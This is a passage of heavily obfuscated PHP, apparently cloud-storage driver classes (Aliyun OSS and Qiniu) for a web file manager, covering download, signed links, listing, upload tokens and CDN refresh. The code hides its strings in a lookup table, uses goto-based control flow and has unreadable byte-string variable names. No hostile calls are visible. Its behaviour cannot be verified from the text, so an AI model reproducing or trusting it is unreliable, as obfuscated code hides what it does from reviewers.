array($aØÎôÙòàÀ[220] => $aĞ”÷“ä¹Ô, $aØÎôÙòàÀ[210] => $eğ¦ÔˆÛ¡Ø[$aØÎôÙòàÀ[210]], $aØÎôÙòàÀ[222] => $Bè¨Ëµ’±ó); goto EÁÈ‡°É‹; EÁÈ‡°É‹: } public function download($Aì°ï­¼ë, $eóè©¦¥Ú‘) { if ($this->isFolder($Aì°ï­¼ë)) { return !1; } try { $eç’Îæºå = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $eóè©¦¥Ú‘); $eç’Îæºå = $this->trafficLimit($_SERVER[í…¶][105], $eç’Îæºå); $this->client->getObject($this->bucket, $this->pathEncode($Aì°ï­¼ë), $eç’Îæºå); } catch (OSS\Core\OssException $eá‰Ú´îæ´) { return !1; } return $eóè©¦¥Ú‘; } public function fileSubstr($cË÷¢ñµâÀ, $A©ßÏïçÏ¡ = 0, $fÜÄíÊâó£ = false) { if ($A©ßÏïçÏ¡ === -1) { $c¬ˆ„Ï­–Ø = array(); } else { if ($fÜÄíÊâó£ === !1) { $FçŸÔÖùï½ = $this->size($cË÷¢ñµâÀ); } else { $FçŸÔÖùï½ = $A©ßÏïçÏ¡ + $fÜÄíÊâó£ - 1; } $c¬ˆ„Ï­–Ø = array(OSS\OssClient::OSS_RANGE => "{$A©ßÏïçÏ¡}\55{$FçŸÔÖùï½}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cË÷¢ñµâÀ), $c¬ˆ„Ï­–Ø); } catch (OSS\Core\OssException $c¹£Æ©¯È³) { think_exception($c¹£Æ©¯È³->getMessage()); return !1; } } private function trafficLimit($EòĞˆÍèÓ÷, $fší×Ìí× = array()) { goto DïÏ¼çË; DïÏ¼çË: $b±Êí„½‰¥ =& $_SERVER[í…¶]; if ($EòĞˆÍèÓ÷ == $b±Êí„½‰¥[1195] && $this->isUploadServer() || $EòĞˆÍèÓ÷ == $b±Êí„½‰¥[105] && $this->isFileOutServer()) { return $fší×Ìí×; } $eæéùĞÕƒĞ = floatval($GLOBALS[$b±Êí„½‰¥[6]][$b±Êí„½‰¥[84]][$b±Êí„½‰¥[103]][$EòĞˆÍèÓ÷]) * 1024 * 1024 * 8; goto fæ‘×äêÊ”; b‚†­­ò¢¾: return $fší×Ìí×; goto E¯Î†Í¢œ°; fæ‘×äêÊ”: if (!$eæéùĞÕƒĞ) { return $fší×Ìí×; } $eæéùĞÕƒĞ = $eæéùĞÕƒĞ < 819200 ? 819200 : ($eæéùĞÕƒĞ > 838860800 ? 838860800 : $eæéùĞÕƒĞ); $fší×Ìí×[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($eæéùĞÕƒĞ); goto b‚†­­ò¢¾; E¯Î†Í¢œ°: } public function link($DõÚâØÌ‚, $E½¹¥ƒÑàê = array()) { $eÂ‚ìÏğ—ß =& $_SERVER[í…¶]; if (!$this->exist($DõÚâØÌ‚) || $this->isFolder($DõÚâØÌ‚)) { return !1; } try { $E½¹¥ƒÑàê = $this->trafficLimit($eÂ‚ìÏğ—ß[105], $E½¹¥ƒÑàê); $aã‚ÙŒŠÆÓ = $this->client->signUrl($this->bucket, $this->pathEncode($DõÚâØÌ‚), 3600 * 12, $eÂ‚ìÏğ—ß[216], $E½¹¥ƒÑàê); return $this->getCdnLink($aã‚ÙŒŠÆÓ); } catch (OSS\Core\OssException $d—ºò½âĞœ) { return !1; } } public function fileOut($BåÈ¸çƒÌ, $B¤ø’½åË· = false, $A‚‚ï·í = false, $a‰˜Äæ…Ö = '') { goto C·Æî¹‰©; d¾§ÅòÉŠÓ: $a˜Êçˆİ»¤ = get_file_mime(get_path_ext($A‚‚ï·í)); if ($a˜Êçˆİ»¤ == $BˆõŒ¿Ãï‡[201]) { return parent::fileOut($BåÈ¸çƒÌ, $B¤ø’½åË·, $A‚‚ï·í, $a‰˜Äæ…Ö); } $B¤ø’½åË· = $B¤ø’½åË· ? $BˆõŒ¿Ãï‡[202] : $BˆõŒ¿Ãï‡[203]; goto Fİº˜†Ş£«; D¢ãÊ·¾Ú: $this->fileOutLink($AËµ„µñËÉ); goto Bôİ¬¢°ù; C·Æî¹‰©: $BˆõŒ¿Ãï‡ =& $_SERVER[í…¶]; if (!$A‚‚ï·í) { $A‚‚ï·í = $this->pathThis($BåÈ¸çƒÌ); } $A‚‚ï·í = rawurlencode($A‚‚ï·í); goto d¾§ÅòÉŠÓ; Fİº˜†Ş£«: $E¹…ìó«´› = array(OSS\OssClient::OSS_SUB_RESOURCE => $BˆõŒ¿Ãï‡[1207] . rawurlencode("{$B¤ø’½åË·}\73\x66\x69\x6c\145\x6e\141\155\145\75{$A‚‚ï·í}")); $E¹…ìó«´›[OSS\OssClient::OSS_SUB_RESOURCE] .= $BˆõŒ¿Ãï‡[1208] . rawurlencode($a˜Êçˆİ»¤); $AËµ„µñËÉ = $this->link($BåÈ¸çƒÌ, $E¹…ìó«´›); goto D¢ãÊ·¾Ú; Bôİ¬¢°ù: } public function fileOutServer($EÂ¯—ä‡Ñ, $d«ÁìÓ£…ˆ = false, $C‰ù‘…Ã¼à = false, $aŒÀö´Ûº° = '') { parent::fileOut($EÂ¯—ä‡Ñ, $d«ÁìÓ£…ˆ, $C‰ù‘…Ã¼à, $aŒÀö´Ûº°); } public function fileOutImage($a‘—Ú³Š½½, $aà–—ÌªÈŒ = 250) { $c”Ï–šå = array(OSS\OssClient::OSS_PROCESS => $_SERVER[í…¶][1209] . $aà–—ÌªÈŒ); $aÕ¦³´‘ = $this->link($a‘—Ú³Š½½, $c”Ï–šå); $this->fileOutLink($aÕ¦³´‘); } public function fileOutImageServer($FÅĞîƒ‘‰ï, $cÑâƒÓŠç” = 250) { parent::fileOutImage($FÅĞîƒ‘‰ï, $cÑâƒÓŠç”); } public function fileOutLink($C‹åï©Š¨¾) { $F÷´”Ã¶§ =& $_SERVER[í…¶]; if (!$this->isCdnHost() && substr($C‹åï©Š¨¾, 0, 7) == $F÷´”Ã¶§[1113]) { $C‹åï©Š¨¾ = $F÷´”Ã¶§[1114] . substr($C‹åï©Š¨¾, 7); } header($F÷´”Ã¶§[156] . $C‹åï©Š¨¾); die; } public function hashMd5($eÏ´öš¿´‚, $F¸‹ê¢®¤ = '') { $E³ò´š‰² =& $_SERVER[í…¶]; $Eâ÷ŒÜàøš = $this->objectMeta($eÏ´öš¿´‚); if (!$Eâ÷ŒÜàøš) { return $E³ò´š‰²[33]; } if (!isset($Eâ÷ŒÜàøš[$E³ò´š‰²[1182]]) && !empty($F¸‹ê¢®¤)) { $B‹Ñá¤ãÊÏ = $this->updateObjMeta($eÏ´öš¿´‚, array($E³ò´š‰²[1182] => $F¸‹ê¢®¤)); $Eâ÷ŒÜàøš[$E³ò´š‰²[1182]] = $B‹Ñá¤ãÊÏ ? $F¸‹ê¢®¤ : $E³ò´š‰²[33]; } return isset($Eâ÷ŒÜàøš[$E³ò´š‰²[1182]]) ? strtolower($Eâ÷ŒÜàøš[$E³ò´š‰²[1182]]) : $E³ò´š‰²[33]; } public function size($A¥Åİ¤ôóì) { $d‰ÛÙÙµŞ´ = $this->objectMeta($A¥Åİ¤ôóì); return $d‰ÛÙÙµŞ´ ? $d‰ÛÙÙµŞ´[$_SERVER[í…¶][77]] : 0; } public function info($c«í¶µµ…æ) { if ($this->isFolder($c«í¶µµ…æ)) { return $this->folderInfo($c«í¶µµ…æ); } else { if ($this->isFile($c«í¶µµ…æ)) { return $this->fileInfo($c«í¶µµ…æ); } } return !1; } public function exist($E³Ù²éµô¥) { return $this->isFile($E³Ù²éµô¥) || $this->isFolder($E³Ù²éµô¥); } public function isFile($Eîó‹Ú¹¤¶) { return !$this->isFolder($Eîó‹Ú¹¤¶) && $this->objectMeta($Eîó‹Ú¹¤¶); } public function isFolder($B²¹‘…°¢…) { return $this->cacheMethod($_SERVER[í…¶][223], $B²¹‘…°¢…); } protected function objectMeta($CÂÓ¶ÙÆšœ) { return $this->cacheMethod($_SERVER[í…¶][224], $CÂÓ¶ÙÆšœ); } protected function _objectMeta($eœÊÈªïİ) { $f¾¥ö×’Ó³ =& $_SERVER[í…¶]; try { $D¿ƒØ¿æ¯‰ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eœÊÈªïİ)); } catch (OSS\Core\OssException $B‰ÓÁõîó) { $D¿ƒØ¿æ¯‰ = !1; } if ($D¿ƒØ¿æ¯‰) { $D¿ƒØ¿æ¯‰[$f¾¥ö×’Ó³[77]] = intval($D¿ƒØ¿æ¯‰[$f¾¥ö×’Ó³[1189]]); } return $D¿ƒØ¿æ¯‰; } protected function _isFolder($A÷Ó”Í×²‰) { $C•È’è†ª =& $_SERVER[í…¶]; if ($A÷Ó”Í×²‰ == $C•È’è†ª[33] || $A÷Ó”Í×²‰ == $C•È’è†ª[8]) { return !0; } $a³ãËË›° = array($C•È’è†ª[1179] => $C•È’è†ª[8], $C•È’è†ª[186] => rtrim($A÷Ó”Í×²‰, $C•È’è†ª[8]) . $C•È’è†ª[8], $C•È’è†ª[1180] => 1, $C•È’è†ª[1181] => $C•È’è†ª[33]); $f¤Èµë‰‚ = $this->client->listObjects($this->bucket, $a³ãËË›°); if ($f¤Èµë‰‚->getObjectList() || $f¤Èµë‰‚->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($cØ„×Åº±…) { parent::__construct(); require_once SDK_DIR . $_SERVER[í…¶][1210]; $this->_init($cØ„×Åº±…); } public function _init($DÖ³îƒà·í) { foreach ($DÖ³îƒà·í as $cƒîéŠ¨° => $DÅˆŸ¸à÷Å) { if (isset($this->{$cƒîéŠ¨°})) { $this->{$cƒîéŠ¨°} = $DÅˆŸ¸à÷Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[í…¶][1211], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EŒ¶¦ëÌó¥, $E‘ªŞŒÁŸâ = '', $A¦‡‹æßŒ› = REPEAT_RENAME) { if ($this->setContent($EŒ¶¦ëÌó¥, $E‘ªŞŒÁŸâ)) { return $this->getPathOuter($EŒ¶¦ëÌó¥); } return !1; } public function mkdir($DÚÕ šÎÔ, $a¢æóØƒ‹’ = REPEAT_SKIP) { goto bàÚ‚Äó¬’; fçˆØìŞö: $DÚÕ šÎÔ = $F»ÁåÄÛ¨½ . $E»¦øª¥‡‡[8]; $aë¯âØÆØÆ = get_path_this($F»ÁåÄÛ¨½); $fæçàáíõ½ = $DÚÕ šÎÔ . $aë¯âØÆØÆ; goto B¤£èÅ‘¥; bàÚ‚Äó¬’: $E»¦øª¥‡‡ =& $_SERVER[í…¶]; $F»ÁåÄÛ¨½ = trim($DÚÕ šÎÔ, $E»¦øª¥‡‡[8]); if ($this->_isFolder($F»ÁåÄÛ¨½)) { return $this->getPathOuter($F»ÁåÄÛ¨½); } goto fçˆØìŞö; B¤£èÅ‘¥: if (!$this->mkfile($fæçàáíõ½)) { return !1; } if (!$this->moveFile($fæçàáíõ½, $DÚÕ šÎÔ)) { $this->delFile($fæçàáíõ½); return !1; } return $this->getPathOuter($F»ÁåÄÛ¨½); goto dÓ×™¯¾Œ; dÓ×™¯¾Œ: } public function copyFile($dâÔ§ìºÃš, $eí›…ÍºïŒ) { $E“Ù‹Ü’ë– = $this->bucketManager->copy($this->bucket, $dâÔ§ìºÃš, $this->bucket, $eí›…ÍºïŒ, !0); return $E“Ù‹Ü’ë– ? !1 : $this->getPathOuter($eí›…ÍºïŒ); } public function moveFile($b§‘†êóäÊ, $BÔ´¢Ìîëœ) { $aóÎÃ¦²” = $this->bucketManager->move($this->bucket, $b§‘†êóäÊ, $this->bucket, $BÔ´¢Ìîëœ, !0); return $aóÎÃ¦²” ? !1 : $this->getPathOuter($BÔ´¢Ìîëœ); } public function delFile($B×«Õµî›) { $BŞÀÙ™Ä³ = $this->bucketManager->delete($this->bucket, $B×«Õµî›); return $BŞÀÙ™Ä³ ? !1 : !0; } public function delFolder($F‹îÑ¦…é) { $còß¦ê‡Ö = $this->fileList($F‹îÑ¦…é); if (empty($còß¦ê‡Ö)) { return !0; } $Eèæ·±¨›¥ = 1000; if (count($còß¦ê‡Ö) <= $Eèæ·±¨›¥) { return $this->qnDelObj($còß¦ê‡Ö) ? !1 : !0; } foreach (array_chunk($còß¦ê‡Ö, $Eèæ·±¨›¥) as $eˆÇ„†²–) { $eÀÃÙöºË = $this->qnDelObj($eˆÇ„†²–); if ($eÀÃÙöºË) { return !1; } } return !0; } private function qnDelObj($a¾¨ÎÌÏ‚¾) { $bŒíëÚà…‡ = $this->bucketManager->buildBatchDelete($this->bucket, $a¾¨ÎÌÏ‚¾); list($b¾ŠÃ•§Áê, $EÇ÷²ÕÍÃê) = $this->bucketManager->batch($bŒíëÚà…‡); return $EÇ÷²ÕÍÃê; } private function fileList($aš…øÆ©¤, $aâõ™Ã·„– = 0) { goto a‹Ç÷²ÂÙŠ; a‹Ç÷²ÂÙŠ: $EÇñÏ½îØ =& $_SERVER[í…¶]; $aš…øÆ©¤ = trim($aš…øÆ©¤, $EÇñÏ½îØ[8]); $AéŸ¹¯ì = empty($aš…øÆ©¤) ? $EÇñÏ½îØ[33] : $aš…øÆ©¤ . $EÇñÏ½îØ[8]; goto CªÌÈœèã‘; e¤åÃ¸ªÂà: $E‰æ–Ø¡à = array(); while (!0) { list($F‚³öÓ´…›, $aºĞó ØÏ) = $this->bucketManager->listFiles($this->bucket, $AéŸ¹¯ì, $A‘ŒèŠ£¾Ï, $Dƒ¶†¿î, $Fˆº…ã“Çµ); if ($aºĞó ØÏ) { return !1; } $A‘ŒèŠ£¾Ï = array_key_exists($EÇñÏ½îØ[1181], $F‚³öÓ´…›) ? $A‘ŒèŠ£¾Ï = $F‚³öÓ´…›[$EÇñÏ½îØ[1212]] : $EÇñÏ½îØ[33]; foreach ($F‚³öÓ´…›[$EÇñÏ½îØ[1213]] as $b—„í÷ËÊ) { $c°×¤¬¯Ş× = $b—„í÷ËÊ[$EÇñÏ½îØ[89]]; if ($aâõ™Ã·„–) { $c°×¤¬¯Ş× = array($EÇñÏ½îØ[28] => $c°×¤¬¯Ş×, $EÇñÏ½îØ[77] => $b—„í÷ËÊ[$EÇñÏ½îØ[1214]]); } $E‰æ–Ø¡à[] = $c°×¤¬¯Ş×; } if ($A‘ŒèŠ£¾Ï == $EÇñÏ½îØ[33]) { break; } } return $E‰æ–Ø¡à; goto b‰Ô—•Ë†; CªÌÈœèã‘: $A‘ŒèŠ£¾Ï = $EÇñÏ½îØ[33]; $Dƒ¶†¿î = 1000; $Fˆº…ã“Çµ = $EÇñÏ½îØ[33]; goto e¤åÃ¸ªÂà; b‰Ô—•Ë†: } public function rename($A¶¡ŒøÏ¸, $FÏ«³®¡¸Ô) { return $this->renameObject($A¶¡ŒøÏ¸, $FÏ«³®¡¸Ô); } public function fileInfo($EÉ¾ÛëÇ¥, $CŠÍªãÆŠ = false, $e„Í•²ê¡¤ = array()) { goto DÂ¯ñãå×À; bÇ¤å²¤ƒˆ: return $E†’øº‚¶—; goto c‘¼ò¤; c·ö„Ò¦„: if (empty($e„Í•²ê¡¤)) { $e„Í•²ê¡¤ = $this->objectMeta($EÉ¾ÛëÇ¥); if (!$e„Í•²ê¡¤) { return $E†’øº‚¶—; } } if (isset($e„Í•²ê¡¤[$DÚôğã™ƒ¼[1215]])) { $E†’øº‚¶—[$DÚôğã™ƒ¼[107]] = substr($e„Í•²ê¡¤[$DÚôğã™ƒ¼[1215]] . $DÚôğã™ƒ¼[33], 0, 10); } if (isset($e„Í•²ê¡¤[$DÚôğã™ƒ¼[1214]])) { $E†’øº‚¶—[$DÚôğã™ƒ¼[77]] = $e„Í•²ê¡¤[$DÚôğã™ƒ¼[1214]]; } goto bÇ¤å²¤ƒˆ; DÂ¯ñãå×À: $DÚôğã™ƒ¼ =& $_SERVER[í…¶]; if ($CŠÍªãÆŠ) { return array($DÚôğã™ƒ¼[28] => $this->pathThis($EÉ¾ÛëÇ¥), $DÚôğã™ƒ¼[75] => $this->getPathOuter($DÚôğã™ƒ¼[8] . $EÉ¾ÛëÇ¥), $DÚôğã™ƒ¼[29] => $DÚôğã™ƒ¼[167], $DÚôğã™ƒ¼[77] => isset($e„Í•²ê¡¤[$DÚôğã™ƒ¼[1214]]) ? $e„Í•²ê¡¤[$DÚôğã™ƒ¼[1214]] : 0, $DÚôğã™ƒ¼[160] => $this->ext($EÉ¾ÛëÇ¥)); } $E†’øº‚¶— = array($DÚôğã™ƒ¼[28] => $this->pathThis($EÉ¾ÛëÇ¥), $DÚôğã™ƒ¼[75] => $this->getPathOuter($DÚôğã™ƒ¼[8] . $EÉ¾ÛëÇ¥), $DÚôğã™ƒ¼[29] => $DÚôğã™ƒ¼[167], $DÚôğã™ƒ¼[187] => 0, $DÚôğã™ƒ¼[107] => 0, $DÚôğã™ƒ¼[77] => 0, $DÚôğã™ƒ¼[160] => $this->ext($EÉ¾ÛëÇ¥), $DÚôğã™ƒ¼[188] => !0, $DÚôğã™ƒ¼[189] => !0); goto c·ö„Ò¦„; c‘¼ò¤: } public function folderInfo($d½¼ÃÕÂá¡, $cïù¯çğ‡ = false) { goto BÇ–´Ó²Ÿ; aÙ©æ›¥: return $fç¼•‡Â±å; goto c±”®³Ìî¶; BÇ–´Ó²Ÿ: $FØ·’ë¡Õß =& $_SERVER[í…¶]; if ($cïù¯çğ‡) { return array($FØ·’ë¡Õß[28] => $this->pathThis($d½¼ÃÕÂá¡), $FØ·’ë¡Õß[75] => $this->getPathOuter($FØ·’ë¡Õß[8] . $d½¼ÃÕÂá¡), $FØ·’ë¡Õß[29] => $FØ·’ë¡Õß[76]); } $fç¼•‡Â±å = array($FØ·’ë¡Õß[28] => $this->pathThis($d½¼ÃÕÂá¡), $FØ·’ë¡Õß[75] => $this->getPathOuter($FØ·’ë¡Õß[8] . $d½¼ÃÕÂá¡), $FØ·’ë¡Õß[29] => $FØ·’ë¡Õß[76], $FØ·’ë¡Õß[187] => 0, $FØ·’ë¡Õß[107] => 0, $FØ·’ë¡Õß[1160] => !0, $FØ·’ë¡Õß[1161] => !0); goto d’Õœ·¾‹; d’Õœ·¾‹: $d½¼ÃÕÂá¡ = rtrim($d½¼ÃÕÂá¡, $FØ·’ë¡Õß[8]) . $FØ·’ë¡Õß[8]; $F‹ÇÅ‡„®  = $this->objectMeta($d½¼ÃÕÂá¡); if (isset($F‹ÇÅ‡„® [$FØ·’ë¡Õß[1215]])) { $fç¼•‡Â±å[$FØ·’ë¡Õß[107]] = substr($F‹ÇÅ‡„® [$FØ·’ë¡Õß[1215]] . $FØ·’ë¡Õß[33], 0, 10); } goto aÙ©æ›¥; c±”®³Ìî¶: } public function listPath($A„â¶º§ÑÜ, $fá†çšò³„ = false) { goto EÇğí‚½Œ; Aå¡ÄøÍù: $c‡ÎŒôõ˜ = $d ¯§İç‹®[33]; $e‰µöùå ƒ = 1000; $dÆÛÑª…Ô¬ = $d ¯§İç‹®[8]; goto D¿°‰’–ÆŒ; EÇğí‚½Œ: $d ¯§İç‹® =& $_SERVER[í…¶]; $A„â¶º§ÑÜ = trim($A„â¶º§ÑÜ, $d ¯§İç‹®[8]); $cªôĞÃ¨ÑÒ = empty($A„â¶º§ÑÜ) ? $d ¯§İç‹®[33] : $A„â¶º§ÑÜ . $d ¯§İç‹®[8]; goto Aå¡ÄøÍù; D¿°‰’–ÆŒ: $FËâŸ‡ÔÑµ = $f²Ó‚õĞª„ = array(); while (!0) { list($AÔëíöÍÁà, $C™¥ŸóĞ‰¬) = $this->bucketManager->listFiles($this->bucket, $cªôĞÃ¨ÑÒ, $c‡ÎŒôõ˜, $e‰µöùå ƒ, $dÆÛÑª…Ô¬); if ($C™¥ŸóĞ‰¬) { return !1; } $c‡ÎŒôõ˜ = array_key_exists($d ¯§İç‹®[1181], $AÔëíöÍÁà) ? $c‡ÎŒôõ˜ = $AÔëíöÍÁà[$d ¯§İç‹®[1212]] : $d ¯§İç‹®[33]; if (isset($AÔëíöÍÁà[$d ¯§İç‹®[1216]])) { foreach ($AÔëíöÍÁà[$d ¯§İç‹®[1216]] as $FåŒ¨±¨) { if ($FåŒ¨±¨ == $cªôĞÃ¨ÑÒ) { continue; } $FËâŸ‡ÔÑµ[] = $this->folderInfo($FåŒ¨±¨, $fá†çšò³„); } } if (isset($AÔëíöÍÁà[$d ¯§İç‹®[1213]])) { foreach ($AÔëíöÍÁà[$d ¯§İç‹®[1213]] as $aå‰‡à¹Öô) { if ($aå‰‡à¹Öô[$d ¯§İç‹®[89]] == $cªôĞÃ¨ÑÒ) { continue; } $f²Ó‚õĞª„[] = $this->fileInfo($aå‰‡à¹Öô[$d ¯§İç‹®[89]], $fá†çšò³„, $aå‰‡à¹Öô); } } if ($c‡ÎŒôõ˜ == $d ¯§İç‹®[33]) { break; } } return array($d ¯§İç‹®[74] => $FËâŸ‡ÔÑµ, $d ¯§İç‹®[73] => $f²Ó‚õĞª„); goto Cê®Ñ§İéß; Cê®Ñ§İéß: } public function has($FšÊ¾çšËõ, $D‰ë¤§î„ = false, $C¿éÙ’ÉËâ = true) { goto aá‹‡à†²; aá‹‡à†²: $f‰™Ïâ‹âœ =& $_SERVER[í…¶]; $FšÊ¾çšËõ = trim($FšÊ¾çšËõ, $f‰™Ïâ‹âœ[8]); $f§•ˆä¬¾ = empty($FšÊ¾çšËõ) ? $f‰™Ïâ‹âœ[33] : $FšÊ¾çšËõ . $f‰™Ïâ‹âœ[8]; goto ešØ¨º½çÁ; B™œá»ƒëí: if ($D‰ë¤§î„) { return array($f‰™Ïâ‹âœ[191] => $D³õ±éîÚ, $f‰™Ïâ‹âœ[192] => $F¼«ìå¿ Ş); } return !1; goto f„Èğ­àš·; ešØ¨º½çÁ: $cİ¯³‘è¦ = $f‰™Ïâ‹âœ[33]; $fÜÔô¢†Â = 1000; $Açªµå¿æ÷ = $f‰™Ïâ‹âœ[8]; goto cÉ½ŒŒë à; cÉ½ŒŒë à: $D³õ±éîÚ = 0; $F¼«ìå¿ Ş = 0; while (!0) { list($F°¢‘¬£ñï, $E·´ÕŒ¶Ä´) = $this->bucketManager->listFiles($this->bucket, $f§•ˆä¬¾, $cİ¯³‘è¦, $fÜÔô¢†Â, $Açªµå¿æ÷); if ($E·´ÕŒ¶Ä´) { return !1; } $cİ¯³‘è¦ = array_key_exists($f‰™Ïâ‹âœ[1181], $F°¢‘¬£ñï) ? $cİ¯³‘è¦ = $F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1212]] : $f‰™Ïâ‹âœ[33]; if ($D‰ë¤§î„) { if (!empty($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1213]])) { $D³õ±éîÚ += count($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1213]]); } if (!empty($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1216]])) { $F¼«ìå¿ Ş += count($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1216]]); } if ($cİ¯³‘è¦ === $f‰™Ïâ‹âœ[33]) { break; } continue; } if ($C¿éÙ’ÉËâ) { if (!empty($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1213]])) { return !0; } } else { if (!empty($F°¢‘¬£ñï[$f‰™Ïâ‹âœ[1216]])) { return !0; } } if ($cİ¯³‘è¦ == $f‰™Ïâ‹âœ[33]) { break; } } goto B™œá»ƒëí; f„Èğ­àš·: } public function listAll($eŞÖÏÛâöÊ) { $bŠÙğˆ°ô“ =& $_SERVER[í…¶]; $e±¯‚ÄØéË = $this->fileList($eŞÖÏÛâöÊ, 1); $fŠÊšÉ„õø = array(); foreach ($e±¯‚ÄØéË as $dæ¾ãë™‡) { $fŠÊšÉ„õø[$dæ¾ãë™‡[$bŠÙğˆ°ô“[28]]] = $dæ¾ãë™‡[$bŠÙğˆ°ô“[77]]; } return $this->listAllFiles($eŞÖÏÛâöÊ, array_keys($fŠÊšÉ„õø), $fŠÊšÉ„õø); } public function canRead($FäÑõøŞÑÜ) { return $this->exist($FäÑõøŞÑÜ) ? !0 : !1; } public function canWrite($D‹åøµ’êã) { return $this->exist($D‹åøµ’êã) ? !0 : !1; } public function getContent($Fñİİ‡‰ÖÕ) { return $this->fileSubstr($Fñİİ‡‰ÖÕ, 0, -1); } public function setContent($FŒÍ”¨×±‘, $EÎó…Àï = '') { $CÓëŒÕ™” = $this->tempFile($this->pathThis($FŒÍ”¨×±‘)); file_put_contents($CÓëŒÕ™”, $EÎó…Àï); if ($this->upload($FŒÍ”¨×±‘, $CÓëŒÕ™”)) { $this->tempFileRemve($CÓëŒÕ™”); return !0; } return !1; } public function refreshUrls($C²‹ó­šø§) { goto c¼ÏŒ£öì; Dº¼µêƒ‰: $eŠØÌÆ÷Ï = new Qiniu\Cdn\CdnManager($this->auth); list($e˜œ·ÑÚÏç, $BíÔ÷‘‘ÒÜ) = $eŠØÌÆ÷Ï->refreshUrls($eÇÅâõ¼å„); if ($BíÔ÷‘‘ÒÜ) { return !1; } goto cƒÜ²Çò“—; cƒÜ²Çò“—: return $e˜œ·ÑÚÏç[$dñ‘…¾„éø[1217]] == $dñ‘…¾„éø[698] ? !0 : !1; goto eÍ¥š¹ù¢Ó; c¼ÏŒ£öì: $dñ‘…¾„éø =& $_SERVER[í…¶]; $eÇÅâõ¼å„ = array(); if (is_array($C²‹ó­šø§)) { foreach ($C²‹ó­šø§ as $f±ŒàŒ¥Ÿ¯) { $eÇÅâõ¼å„[] = $this->link($f±ŒàŒ¥Ÿ¯); } } else { $eÇÅâõ¼å„[] = $this->link($C²‹ó­šø§); } goto Dº¼µêƒ‰; eÍ¥š¹ù¢Ó: } public function fileSubstr($CÚ®‡ëÇ¹¢, $FØ›´¦ÅùĞ, $Eëº’ÄÎ™Ù) { $Bˆ¦Æ¹…Á =& $_SERVER[í…¶]; if (!($EâÔ¼ÓìÔ = $this->link($CÚ®‡ëÇ¹¢))) { return !1; } $C£áÂĞ·’ = !1; if ($Eëº’ÄÎ™Ù > 0) { $C¶Îˆ¦‡æì = $FØ›´¦ÅùĞ + $Eëº’ÄÎ™Ù - 1; $C£áÂĞ·’ = array($Bˆ¦Æ¹…Á[1218] . $FØ›´¦ÅùĞ . $Bˆ¦Æ¹…Á[421] . $C¶Îˆ¦‡æì); } $F¦ß‡÷ÏÄ = url_request($EâÔ¼ÓìÔ, $Bˆ¦Æ¹…Á[216], !1, $C£áÂĞ·’); return $F¦ß‡÷ÏÄ[$Bˆ¦Æ¹…Á[691]] ? $F¦ß‡÷ÏÄ[$Bˆ¦Æ¹…Á[1032]] : !1; } public function upload($FˆççÆğ‡, $f”‚çÓõ†õ, $DĞˆ‡æï¯Í = false, $E”ƒ†¾—Ò¿ = REPEAT_REPLACE) { $dº¬¿Øà = new Qiniu\Storage\UploadManager(); $c »–Ç¶Ô = $this->auth->uploadToken($this->bucket, $FˆççÆğ‡); $EÄ¶Ô‚ôŠã = get_file_mime(get_path_ext($f”‚çÓõ†õ)); list($d›Â¤–·Ö, $f¬´²¡íÅÔ) = $dº¬¿Øà->putFile($c »–Ç¶Ô, $FˆççÆğ‡, $f”‚çÓõ†õ, null, $EÄ¶Ô‚ôŠã); return $f¬´²¡íÅÔ ? !1 : $this->getPathOuter($FˆççÆğ‡); } public function uploadFormData($b¹Ú¡Ïá¦, $bó¼¦ë¡ËÖ = 3600) { return $this->uploadToken($b¹Ú¡Ïá¦, $bó¼¦ë¡ËÖ); } public function multiUploadFormData($d«¡ÑÆƒ¯ã, $cƒøãŠ±Ö = 3600) { return $this->uploadToken($d«¡ÑÆƒ¯ã, $cƒøãŠ±Ö); } private function uploadToken($Bœ¶èĞÇ¢Å, $aÄ‡æŠÚ³ù = 3600) { goto BïÏö†˜áœ; BïÏö†˜áœ: $BñŸ²©»µ‹ =& $_SERVER[í…¶]; $AÒ³Ş„Õ = $aÄ‡æŠÚ³ù; $bßÉÉŞéóä = array($BñŸ²©»µ‹[1219] => $BñŸ²©»µ‹[1220]); goto eŠõ…Öï¾’; eŠõ…Öï¾’: $F¼Ÿï­¼ö¬ = null; $DÜ“Á‘ÀôÛ = $this->auth->uploadToken($this->bucket, $F¼Ÿï­¼ö¬, $AÒ³Ş„Õ, $bßÉÉŞéóä, !0); $aö÷»õÇ£ = empty($this->region) || $this->region == $BñŸ²©»µ‹[1221] ? $BñŸ²©»µ‹[33] : $BñŸ²©»µ‹[421] . $this->region; goto CîÕ±‡©ÉÁ; CîÕ±‡©ÉÁ: $A„˜•Ûêñ  = http_type() . "\x3a\57\x2f\165\160\154\157\x61\144{$aö÷»õÇ£}\x2e\161\151\x6e\151\165\x70\56\x63\x6f\x6d\57"; return array($BñŸ²©»µ‹[1222] => $DÜ“Á‘ÀôÛ, $BñŸ²©»µ‹[1223] => $A„˜•Ûêñ ); goto b³ª»«²ğ; b³ª»«²ğ: } public function download($C„¢–È¿¾, $Côµ¬‰“é) { goto a†å†¯´¸Œ; eµ¨ˆ¾°òĞ: fclose($Fµ„ãÄøÄ); return $Côµ¬‰“é; goto d¹¦İŸ„²Ñ; a†å†¯´¸Œ: $aŒ‚‡‚”é = IO::getPathInner(IO::mkfile($Côµ¬‰“é)); if (!($dÂŒ­¦®¹ = $this->link($C„¢–È¿¾))) { return !1; } $f×ĞÜëÀìô 